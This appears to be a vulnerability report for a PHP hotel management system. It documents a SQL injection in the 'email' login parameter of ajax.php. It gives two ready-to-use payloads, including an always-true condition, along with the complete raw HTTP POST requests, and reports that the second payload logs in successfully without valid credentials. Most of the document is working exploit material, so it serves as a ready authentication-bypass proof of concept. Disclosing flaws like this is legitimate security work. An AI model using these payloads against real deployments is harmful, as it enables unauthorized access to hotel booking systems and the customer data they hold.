# Multi Language Hotel Management Software v1.0 by Nikhil_B has SQL injection

BUG_Author:hushuo

vendors:https://www.sourcecodester.com/php/15551/multi-language-hotel-management-software-free-download-source-code.html

Vulnerability File: /sparkz/sparkz/ajax.php

POST parameter 'email' exists SQL injection vulnerability

Payload1: email=12' or '7618'='7616&password=32&login=

```
POST /sparkz/sparkz/ajax.php HTTP/1.1
Host: localhost
Content-Length: 54
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/sparkz/sparkz/login.php?loginE
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=hf32uhevelnm5mvoetjhf9ecih
Connection: close

email=12%27+or+%277618%27%3D%277616&password=32&login=
```

Login error

![image](https://github.com/hu1780663664/pic/blob/main/1.png)

Payload2: email=12' or '7618'='7618&password=32&login=

```
POST /sparkz/sparkz/ajax.php HTTP/1.1
Host: localhost
Content-Length: 54
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/sparkz/sparkz/login.php?loginE
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=hf32uhevelnm5mvoetjhf9ecih
Connection: close

email=12%27+or+%277618%27%3D%277618&password=32&login=
```

Login successful

![image](https://github.com/hu1780663664/pic/blob/main/2.png)


